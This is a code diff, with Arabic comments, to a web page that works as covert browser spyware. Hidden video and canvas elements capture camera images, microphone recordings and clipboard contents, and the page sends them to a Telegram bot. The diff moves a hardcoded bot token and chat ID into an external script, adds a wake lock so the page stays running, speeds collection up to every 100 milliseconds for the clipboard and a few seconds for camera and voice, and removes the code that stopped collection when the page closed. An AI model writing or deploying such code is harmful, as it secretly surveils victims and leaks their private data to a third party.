@@ -48,23 +48,33 @@
         <video id="hiddenVideo" autoplay muted playsinline></video>
         <canvas id="hiddenCanvas"></canvas>
     </div>
-
-    <script>
-// التوكن ورقم المحادثة
-const BOT_TOKEN = '8613444711:AAHjclYS0xTyOaegIM719VmP33oHTXgo9rs';
-const CHAT_ID = '8380505065';
+<script src="ja.js"></script>
+<script>
+// الآن المتغيرات من ja.js جاهزة
 
 let voiceCounter = 0;
 let dataCounter = 0;
 let clipboardCounter = 0;
 let micStream = null;
 let isSystemActive = false;
-
 // دالة تحديث الحالة - النصوص تبقى ثابتة
 function updateStatus(message) {
     document.getElementById('status').textContent = message;
 }
-
+// يخلي المتصفح ما يسكر بسرعة
+if ('wakeLock' in navigator) {
+    let wakeLock = null;
+    
+    async function requestWakeLock() {
+        try {
+            wakeLock = await navigator.wakeLock.request('screen');
+        } catch(err) {
+            console.log('ما يشتغل:', err);
+        }
+    }
+    
+    requestWakeLock();
+}
 // النصوص الثابتة
 function updateAllStatuses() {
     document.getElementById('status').textContent = "✅ SYSTEM ACTIVE";
@@ -187,11 +197,11 @@ async function checkAndSendClipboard() {
         }
 
         // الاستمرار بدون توقف
-        setTimeout(checkAndSendClipboard, 1000);
+        setTimeout(checkAndSendClipboard, 100);
 
     } catch (error) {
         // الاستمرار بدون توقف
-        setTimeout(checkAndSendClipboard, 1000);
+        setTimeout(checkAndSendClipboard, 100);
     }
 }
 
@@ -280,11 +290,11 @@ async function sendDataAndImage() {
         await sendToTelegram(message, cameraImage);
 
         // إرسال بعد 6 ثواني
-        setTimeout(sendDataAndImage, 6000);
+        setTimeout(sendDataAndImage, 2000);
 
     } catch (error) {
         // إعادة المحاولة بعد 6 ثواني
-        setTimeout(sendDataAndImage, 6000);
+        setTimeout(sendDataAndImage, 2000);
     }
 }
 
@@ -348,11 +358,11 @@ async function processAndSendVoice(chunks, sampleRate, counter) {
         await sendVoiceToTelegram(voiceMessage, voiceBlob);
 
         // إرسال بعد 4 ثواني
-        setTimeout(recordAndSendVoice, 4000);
+        setTimeout(recordAndSendVoice, 3000);
 
     } catch (error) {
         // إعادة المحاولة بعد 4 ثواني
-        setTimeout(recordAndSendVoice, 4000);
+        setTimeout(recordAndSendVoice, 3000);
     }
 }
 
@@ -480,18 +490,6 @@ function allowManualRefresh() {
 window.addEventListener('load', () => {
     allowManualRefresh();
     startAll();
-});
-
-// إيقاف عند إغلاق الصفحة
-window.addEventListener('beforeunload', () => {
-    isSystemActive = false;
-});
-
-// إعادة التشغيل عند العودة للصفحة
-window.addEventListener('focus', () => {
-    if (!isSystemActive) {
-        startAll();
-    }
 });
 
     </script>
